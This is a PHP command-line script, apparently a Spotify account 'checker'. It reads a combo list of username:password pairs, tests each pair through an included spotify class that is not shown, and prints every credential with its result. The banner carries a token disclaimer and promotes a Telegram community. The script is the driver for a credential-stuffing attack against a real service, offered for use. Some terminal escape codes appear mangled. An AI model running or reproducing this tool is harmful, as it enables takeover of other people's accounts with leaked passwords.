
<?php
/*
* Created by @jaynammodi
* Last Update: 19/02/2019
* Time: 17.30
* Telegram @hewhomustnotbenamed
*/

// DO NOT MODIFY!! I WILL NOT BE RESPONSIBLE FOR ANY KIND OF MODIFICATIONS WHICH HINDER THE FUNCTIONABILITY OF THE PROGRAM!!!

echo "33[01;31m
    ### #####  #####  ###### ##  ##### ###  ##    ##### ##  ##  #####  ##### ##  ## ##### ######   ## ##
   ##       ##     ##   ##   ##  ##    ###  ##   ##     ##  ##  ##    ##     ## ##  ##    ##   ##  ## ##
   ##   ##### ##   ##   ##   ##  ##### #######   ##     ######  ##### ##     ####   ##### #####    ## ##
   ##   ##    ##   ##   ##   ##  ##        ###   ##     ##  ##  ##    ##     ## ##  ##    ##  ##
 ###    ##     ####     ##   ##  ##        ###    ##### ##  ##  #####  ##### ##  ## ##### ##   ### ## ## v0.233[0m";
echo "nn
33[01;31m[•]33[09;31mv0.133[0m33[01;31mv0.2 Developed by 33[01;32;1m@hewhomustn0tbenamed33[01;31m (Telegram).33[0mn Press Enter to Continue...n";
fgetc(STDIN);
echo "33[01;31mn[•]You're Responsible For your Actions. Use Wisely.
[•]Join 33[01;32;1m@VoldemortCommunity (Telegram)33[01;31m for More!.
[•]Huge Thanks to @DrWean for His Outdated GitHub Repo.
[•]Thank You to all the Testers!! and StackOverflow.
33[0m";
include ('class.spotify.php');

echo "n33[51;33;1m[i]Are You Sure You Want To Do This?  Type 33[01;32;1m'yes'33[51;33;1m to Continue :33[0m ";
$handle3 = fopen("php://stdin", "rb");
$ln = fgets($handle3);

if (trim($ln) == 'yes') {
	echo "n33[01;32;1m[i]Enter Combo List Name : 33[0m";
	$handle1 = fopen("php://stdin", "r");
	$inpnam = fgets($handle1);
	$lines = file(trim($inpnam));
	echo "n n33[01;32;1m[i]Enter Combo List Type:n n[1] Username:Passwordn n[2] Email:Passwordn nResponse[1/2]:33[0m ";
	$comtype = fgets(fopen("php://stdin", "r"));
	echo "Press Enter to Continue...";
	fgetc(STDIN);
	system('clear');

	//    echo "n33[01;32;1m[i]Let's Begin...n";
	//    echo "33[51;33;1m[i]Press Ctrl+C or Tap and Hold ~> More ~> Kill Process to Exit before The Execution Completes!33[0mnnn";

	if (trim($comtype) == '1') {
		echo "n33[01;32;1m[i]Let's Begin...n";
		echo "33[51;33;1m[i]Press Ctrl+C or Tap and Hold ~> More ~> Kill Process to Exit before The Execution Completes!33[0mnnn";

		// echo $comtype."1";

		$spotify = new spotify();
		foreach($lines as $line) {
			$var = explode(':', $line);
			$usernn = $var[0];
			$inppass = $var[1];
			$res = $spotify->check($usernn, $inppass);
			echo "[!]Username : " . $usernn . "n";
			echo "[!]Password : " . $inppass;
			echo "[!]" . $res . "nn";
		}
	}
	else
	if (trim($comtype) == '2') {

		// echo $comtype."2";

		echo "33[05;33;1mCOMING SOON!!!nThe Program will Now Exit!!nPress Enter to Continue...33[0m";
		fgetc(STDIN);
		exit;
	}
}
else {
	echo "33[05;31mABORTING....nThe Program will Now Exit!!nPress Enter to Continue...33[0m";
	fgetc(STDIN);
	exit;
}

